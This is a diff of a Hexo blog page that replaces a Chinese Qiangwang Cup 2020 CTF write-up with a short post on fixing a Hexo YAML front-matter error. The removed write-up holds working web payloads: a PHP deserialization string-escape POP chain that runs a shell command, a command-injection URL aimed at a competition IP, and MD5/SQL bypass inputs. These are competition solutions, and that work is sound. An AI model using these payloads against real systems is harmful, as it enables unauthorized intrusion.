@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="强网杯2020Writeup, 不要用自己短浅的见识去丈量别人的世界">
+    <meta name="keywords" content="使用hexo发布文章报错can not read a block mapping entry, 不要用自己短浅的见识去丈量别人的世界">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>强网杯2020Writeup | Greenplumte4的小屋</title>
+    <title>使用hexo发布文章报错can not read a block mapping entry | Greenplumte4的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">强网杯2020Writeup</h1>
+                    <h1 class="description center-align post-title">使用hexo发布文章报错can not read a block mapping entry</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/%E4%BA%BF%E7%82%B9%E5%B0%8F%E7%BB%86%E8%8A%82/">
+                                <span class="chip bg-color">亿点小细节</span>
                             </a>
                         
                     </div>
@@ -443,8 +443,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" class="post-category">
-                                CTF比赛
+                            <a href="/categories/%E4%BA%BF%E7%82%B9%E5%B0%8F%E7%BB%86%E8%8A%82/" class="post-category">
+                                亿点小细节
                             </a>
                         
                     </div>
@@ -456,14 +456,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-08-26
+                    2021-01-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-08-26
+                    2021-01-14
                 </div>
                 
 
@@ -477,294 +477,21 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>大菜鸡终于开始有了输出！</p>
-<p>可惜今年misc只有一道题qwq</p>
-<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h2 id="WEB辅助-solved"><a href="#WEB辅助-solved" class="headerlink" title="WEB辅助|solved"></a>WEB辅助|solved</h2><p>因为菜鸡看题的晚，现在过来进行分析，给了源码</p>
-<p>index.php</p>
-<pre class=" language-plain"><code class="language-plain"><?php
-@error_reporting(0);
-require_once "common.php";
-require_once "class.php";
-
-if (isset($_GET['username']) && isset($_GET['password']))&#123;
-    $username = $_GET['username'];
-    $password = $_GET['password'];
-    $player = new player($username, $password);
-    file_put_contents("caches/".md5($_SERVER['REMOTE_ADDR']), write(serialize($player)));&nbsp;
-    echo sprintf('Welcome %s, your ip is %s\n', $username, $_SERVER['REMOTE_ADDR']);
-&#125;
-else&#123;
-    echo "Please input the username or password!\n";
-&#125;
-
-?></code></pre>
-<p>play.php</p>
-<pre class=" language-plain"><code class="language-plain"><?php
-@error_reporting(0);
-require_once "common.php";
-require_once "class.php";
-
-@$player = unserialize(read(check(file_get_contents("caches/".md5($_SERVER['REMOTE_ADDR'])))));
-print_r($player);
-if ($player->get_admin() === 1)&#123;
-    echo "FPX Champion\n";
-&#125;
-else&#123;
-    echo "The Shy unstoppable\n";
-&#125;
-?></code></pre>
-<p>class.php</p>
-<pre class=" language-plain"><code class="language-plain"><?php
-class player&#123;
-&nbsp; &nbsp; protected $user;
-&nbsp; &nbsp; protected $pass;
-&nbsp; &nbsp; protected $admin;
-
-&nbsp; &nbsp; public function __construct($user, $pass, $admin = 0)&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->user = $user;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->pass = $pass;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->admin = $admin;
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function get_admin()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; return $this->admin;
-&nbsp; &nbsp; &#125;
-&#125;
-
-class topsolo&#123;
-&nbsp; &nbsp; protected $name;
-
-&nbsp; &nbsp; public function __construct($name = 'Riven')&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function TP()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; if (gettype($this->name) === "function" or gettype($this->name) === "object")&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $name = $this->name;
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $name();
-&nbsp; &nbsp; &nbsp; &nbsp; &#125;
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function __destruct()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->TP();
-&nbsp; &nbsp; &#125;
-
-&#125;
-
-class midsolo&#123;
-&nbsp; &nbsp; protected $name;
-
-&nbsp; &nbsp; public function __construct($name)&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function __wakeup()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; if ($this->name !== 'Yasuo')&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $this->name = 'Yasuo';
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "No Yasuo! No Soul!\n";
-&nbsp; &nbsp; &nbsp; &nbsp; &#125;
-&nbsp; &nbsp; &#125;
-&nbsp; &nbsp;&nbsp;
-
-&nbsp; &nbsp; public function __invoke()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->Gank();
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function Gank()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; if (stristr($this->name, 'Yasuo'))&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "Are you orphan?\n";
-&nbsp; &nbsp; &nbsp; &nbsp; &#125;
-&nbsp; &nbsp; &nbsp; &nbsp; else&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "Must Be Yasuo!\n";
-&nbsp; &nbsp; &nbsp; &nbsp; &#125;
-&nbsp; &nbsp; &#125;
-&#125;
-
-class jungle&#123;
-&nbsp; &nbsp; protected $name = "";
-
-&nbsp; &nbsp; public function __construct($name = "Lee Sin")&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function KS()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; system("cat /flag");
-&nbsp; &nbsp; &#125;
-
-&nbsp; &nbsp; public function __toString()&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; $this->KS();&nbsp;&nbsp;
-&nbsp; &nbsp; &nbsp; &nbsp; return "";&nbsp;&nbsp;
-&nbsp; &nbsp; &#125;
-
-&#125;
-?></code></pre>
-<p>common.php</p>
-<pre class=" language-plain"><code class="language-plain"><?php
-function read($data)&#123;
-&nbsp; &nbsp; $data = str_replace('\0*\0', chr(0)."*".chr(0), $data);
-&nbsp; &nbsp; return $data;
-&#125;
-function write($data)&#123;
-&nbsp; &nbsp; $data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);
-&nbsp; &nbsp; return $data;
-&#125;
-
-function check($data)
-&#123;
-&nbsp; &nbsp; if(stristr($data, 'name')!==False)&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; die("Name Pass\n");
-&nbsp; &nbsp; &#125;
-&nbsp; &nbsp; else&#123;
-&nbsp; &nbsp; &nbsp; &nbsp; return $data;
-&nbsp; &nbsp; &#125;
-&#125;
-?></code></pre>
-<p>_pop链：player中new一个topsolo类__destruct调用$name作为函数，$name为midsolo类，调用__invoke，里面的$name是jungle类stristr调用__tostring执行cat flag</p>
-<p>str_replace(‘\0<em>\0’, chr(0).”</em>“.chr(0), $data); 这里是5变3</p>
-<p>我们要吃掉strlen(‘;s:7:”<em>pass”;s:164:”‘) 22个字符，虽然显示是20，但是</em>旁边还有两个东西</p>
-<p>所以就55变33吃掉22个字符,就是username的内容。</p>
-<p><img src="1.PNG"></p>
-<p>要学习直接搜字符串逃逸。</p>
-<p>DASCTF4月赛原题</p>
-<p>payload如下：</p>
-<pre class=" language-plain"><code class="language-plain">?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=;S:7:"\00*\00pass";O:7:"topsolo":1:&#123;S:7:"\00*\00\6e\61\6d\65";O:7:"midsolo":2:&#123;S:7:"\00*\00\6e\61\6d\65";O:6:"jungle":1:&#123;S:7:"\00*\00\6e\61\6d\65";S:7:"Lee Sin";&#125;&#125;&#125;</code></pre>
-<h2 id="主动-solved"><a href="#主动-solved" class="headerlink" title="主动 |solved"></a>主动 |solved</h2><p>buu上的GXCTF–Ping ~ ~的简化版</p>
-<p>web狗的签到题</p>
-<p>3s搞定</p>
-<p>考点，内联执行</p>
-<p><a target="_blank" rel="noopener" href="http://39.96.23.228:10002/?ip=127.0.0.1;cat%20%60ls%60">http://39.96.23.228:10002/?ip=127.0.0.1;cat%20<code>ls</code></a></p>
-<p><img src="https://uploader.shimo.im/f/y2OpvNhROPJChYhF.png!thumbnail" alt="图片"></p>
-<h2 id="Funhash-solved"><a href="#Funhash-solved" class="headerlink" title="Funhash |solved"></a>Funhash |solved</h2><pre class=" language-plain"><code class="language-plain"><?php
-include&nbsp;'conn.php';
-highlight_file("index.php");
-//level&nbsp;1
-if&nbsp;($_GET["hash1"]&nbsp;!=&nbsp;hash("md4",&nbsp;$_GET["hash1"]))
-&#123;
-&nbsp;&nbsp;&nbsp;&nbsp;die('level&nbsp;1&nbsp;failed');
-&#125;
-//level&nbsp;2
-if($_GET['hash2']&nbsp;===&nbsp;$_GET['hash3']&nbsp;||&nbsp;md5($_GET['hash2'])&nbsp;!==&nbsp;md5($_GET['hash3']))
-&#123;
-&nbsp;&nbsp;&nbsp;&nbsp;die('level&nbsp;2&nbsp;failed');
-&#125;
-//level&nbsp;3
-$query&nbsp;=&nbsp;"SELECT&nbsp;*&nbsp;FROM&nbsp;flag&nbsp;WHERE&nbsp;password&nbsp;=&nbsp;'"&nbsp;.&nbsp;md5($_GET["hash4"],true)&nbsp;.&nbsp;"'";
-$result&nbsp;=&nbsp;$mysqli->query($query);
-$row&nbsp;=&nbsp;$result->fetch_assoc();&nbsp;
-var_dump($row);
-$result->free();
-$mysqli->close();
-
-?></code></pre>
-<p>三层绕过<br>第一层</p>
-<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/02/09/md5-collisions/">https://evi0s.com/2019/02/09/md5-collisions/</a></p>
-<p><img src="2.PNG"></p>
-<p>第二层</p>
-<p>数组绕过</p>
-<p>第三层</p>
-<p>万能密码</p>
-<p>payload：</p>
-<pre class=" language-plain"><code class="language-plain">?hash1=0e001233333333333334557778889&hash2[]=1&hash3[]=0&hash4=ffifdyop</code></pre>
-<p><img src="3.PNG"></p>
-<h2 id="Upload-solved"><a href="#Upload-solved" class="headerlink" title="Upload|solved"></a>Upload|solved</h2><p>一个数据包</p>
-<p>有http，直接导出，得到两个文件，然后提示是steghide，下面那个steghide.php里面有图片，用foremost分离出来后，得到图片</p>
-<p>因为没有给提示，尝试用steghide试试弱密码</p>
-<p>steghide extract -sf “gs.jpg” -xf “hide.txt” -p “123456”</p>
-<p>flag出</p>
-<p><img src="4.PNG"></p>
-<h2 id="红方辅助-solved"><a href="#红方辅助-solved" class="headerlink" title="红方辅助|solved"></a>红方辅助|solved</h2><p>给了一个数据包和一个py脚本</p>
-<p>对协议进行一个统计分析，然后发现是ssh</p>
-<p><img src="5.PNG"></p>
-<p>wireshark追踪流，分析</p>
-<p><img src="6.PNG"></p>
-<p>从加密脚本入手得知</p>
-<p>数据是有所对应的，</p>
-<p><img src="7.PNG"></p>
-<p>接着写脚本进行解密即可</p>
-<p>然后发现有很多奇奇怪怪的字符</p>
-<p>emmmm</p>
-<p>而且很多都是相同的</p>
-<p>去掉这些字符</p>
-<p>得到flag</p>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><p>7个葫芦娃…一个流量包里面套那么多层是真的没想到</p>
-<p>题目说难不难，说简单不简单，谁能想得到呢</p>
-<h3 id="level1-level2"><a href="#level1-level2" class="headerlink" title="level1+level2"></a>level1+level2</h3><p>审计流量包里面</p>
-<p>发现这个奇怪的网址，登录，</p>
-<p><a target="_blank" rel="noopener" href="http://39.99.247.28/fonts/1">http://39.99.247.28/fonts/1</a></p>
-<p><img src="8.PNG"></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>还是流量包</p>
-<p>找到ssllog解密的数据包</p>
-<p>接着访问数据包里面的网址</p>
-<p><a target="_blank" rel="noopener" href="https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png">https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</a></p>
-<p>开局一张图，剩下全靠猜</p>
-<p>拿到图片的时候还去想了想是啥</p>
-<p>把图片下载下来</p>
-<p><img src="9.PNG"></p>
-<p>放入010editor里面分析</p>
-<p><img src="10.PNG"></p>
-<p>发现有base64码</p>
-<p>解码得到</p>
-<p><img src="11.PNG"></p>
-<p>以及</p>
-<p><img src="12.PNG"></p>
-<p>尝试分析为二进制转字符串，此方向不同，遂联想0101转二维码</p>
-<p>网上搜索脚本，然后进行改长与宽，最后生成60*60的二维码有效</p>
-<p>脚本如下：</p>
-<pre class=" language-plain"><code class="language-plain">from PIL import Image 
-import binascii
-file = open("2","r")
-i=0
-H=60
-W=60
-pic = Image.new("RGB",(W,H))
-zo=file.read()
-for y in range(0,H):
-    for x in range(0,W):
-        if(zo[i]=="0"):
-            pic.putpixel([x,y],(255,255,255))
-        else:
-            pic.putpixel([x,y],(0,0,0))
-        i=i+1
-pic.show()
-pic.save('pg</code></pre>
-<p><img src="13.PNG"></p>
-<p>得到图片如上</p>
-<p>然后拿到level4的百度云</p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>然后又是一张图……</p>
-<p><img src="14.PNG"></p>
-<p>那么又是什么东西呢</p>
-<p>用stegdect检测–&gt;jphg加密，</p>
-<p>然后爆破密码，得到密码为power123</p>
-<p>然后得到level4和一个百度云</p>
-<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw">https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw</a></p>
-<p>mrpt</p>
-<p>level4_here_all</p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>一个压缩包，010editor分析，zip伪加密，修改，分离出，得到level5和一堆东西</p>
-<p><img src="15.PNG"></p>
-<p>接下来看里面有level6和level7</p>
-<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>level6的压缩里的文件都是454的长度….</p>
-<p>尝试密码爆破，无果</p>
-<p>emmm</p>
-<p>454  —-   CRC 都是三字节，尝试CRC爆破，得到level6</p>
-<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>因为压缩包外有1.jpg，压缩包里面也有，明文爆破，</p>
-<p>得到两张图—&gt;双图狂喜盲水印，试着用了好几款python的盲水印的工具–py3可以….上次遇到的那个题是py3不行，55555，windows常备双水印</p>
-<p><img src="16.PNG"></p>
-<p>接着以为拿到level7，我可是狂喜了一下，提交，啊，不对</p>
-<p>去给的网址看看</p>
-<h3 id="final-level"><a href="#final-level" class="headerlink" title="final_level"></a>final_level</h3><p>没想到还有final_level</p>
-<p>qwq</p>
-<p>上去之后</p>
-<p>接着想了一晚上提示</p>
-<pre><code>&lt;!-- How did it become a blank , maybe you should pass (no one can find me)--&gt;</code></pre>
-<p>错失一血，让我们都觉得好沮丧</p>
-<p>不过确实漏掉了一个点，后面去百度了跟空格且跟网页有关的隐写，发现snow隐写相近</p>
-<p>snow解密<a target="_blank" rel="noopener" href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
-<p>使用密码blank、pass和no one can find me</p>
-<p>最后key为no one can find me</p>
-<p>得到final_level</p>
-<p><img src="17.PNG"></p>
-<p>最后得到flag：</p>
-<p>flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}</p>
+                <p>之前有几篇文章没有传上去</p>
+<p>然后没有注意报错，这次想彻底的改变自己的一些懒散的性格23333</p>
+<p>踩坑如下：</p>
+<p>之前的文章的tag以及category没有在冒号之后加空格进行了报错</p>
+<pre><code>title: 使用hexo发布文章报错can not read a block mapping entry
+top: false
+tags:亿点小细节
+categories:亿点小细节</code></pre>
+<blockquote>
+<p> can not read a block mapping entry; a multiline key may not be an implicit key at line X, column X</p>
+</blockquote>
+<p>后面添加空格之后即可解决</p>
+<p>当然还有师傅的也是有报错</p>
+<p>有可能是文件名里面出现了英文字符的双引号，导致yaml语法解析出错，将英文双引号修改成中文双引号即可修复</p>
+<p>今日份踩坑2333</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -808,7 +535,7 @@ pic.save('pg</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://greenplumte4.github.io/2020/08/26/qiang-wang-bei-2020/">https://greenplumte4.github.io/2020/08/26/qiang-wang-bei-2020/</a>
+                    <a href="https://greenplumte4.github.io/2021/01/14/shi-yong-hexo-fa-bu-wen-zhang-bao-cuo-can-not-read-a-block-mapping-entry/">https://greenplumte4.github.io/2021/01/14/shi-yong-hexo-fa-bu-wen-zhang-bao-cuo-can-not-read-a-block-mapping-entry/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -846,8 +573,8 @@ pic.save('pg</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/%E4%BA%BF%E7%82%B9%E5%B0%8F%E7%BB%86%E8%8A%82/">
+                                    <span class="chip bg-color">亿点小细节</span>
                                 </a>
                             
                         </div>
@@ -1015,52 +742,52 @@ pic.save('pg</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/09/12/wen-jian-xi-tong-yu-wen-jian-cun-chu/">
+                <a href="/2021/01/14/shi-yong-hexo-fa-bu-wen-zhang-bao-cuo-can-not-read-a-block-mapping-entry/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="文件系统与文件存储">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="使用hexo发布文章报错can not read a block mapping entry">
                         
-                        <span class="card-title">文件系统与文件存储</span>
+                        <span class="card-title">使用hexo发布文章报错can not read a block mapping entry</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-最近在看书，就当写读书笔记了
-
-一、常见磁盘分区格式1.FAT16常见地方：MS-DOS及老版本的WINDOWS95
-采用16位的磁盘分区表
-最大支持2GB的磁盘分区，读取速率上升
-独特优点：几乎所有操作系统都支持该分区模式（DOS、 W
+                            之前有几篇文章没有传上去
+然后没有注意报错，这次想彻底的改变自己的一些懒散的性格23333
+踩坑如下：
+之前的文章的tag以及category没有在冒号之后加空格进行了报错
+title: 使用hexo发布文章报错can not read a
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/MISC/" class="post-category">
-                                    MISC
+                            <a href="/categories/%E4%BA%BF%E7%82%B9%E5%B0%8F%E7%BB%86%E8%8A%82/" class="post-category">
+                                    亿点小细节
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/MISC/">
-                        <span class="chip bg-color">MISC</span>
+                    <a href="/tags/%E4%BA%BF%E7%82%B9%E5%B0%8F%E7%BB%86%E8%8A%82/">
+                        <span class="chip bg-color">亿点小细节</span>
                     </a>
                     
                 </div>
@@ -1074,34 +801,31 @@ pic.save('pg</code></pre>
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/21/ciscn2020-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/">
+                <a href="/2021/01/14/pat-jia-ji-1008/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="CISCN2020全国大学生信息安全竞赛初赛部分Writeup">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="PAT甲级1008">
                         
-                        <span class="card-title">CISCN2020全国大学生信息安全竞赛初赛部分Writeup</span>
+                        <span class="card-title">PAT甲级1008</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            今年的题目没有去年的质量高倒是，跟队友一起，看队友秒杀题目觉得自己好菜（bushi
-然后今年主要是去死磕misc了，就没有完整的看web了，就把我看了的web题丢上来吧。
-后面弄懂我再把全队的wp丢上来，毕竟是全队的努力
-WEBeasyph
+                            1008 Elevator (20分)The highest building in our city has only one elevator. A request list is made up with N positive num
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" class="post-category">
-                                    CTF比赛
+                            <a href="/categories/PAT/" class="post-category">
+                                    PAT
                                 </a>
                             
                             
@@ -1111,8 +835,8 @@ WEBeasyph
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/PAT/">
+                        <span class="chip bg-color">PAT</span>
                     </a>
                     
                 </div>
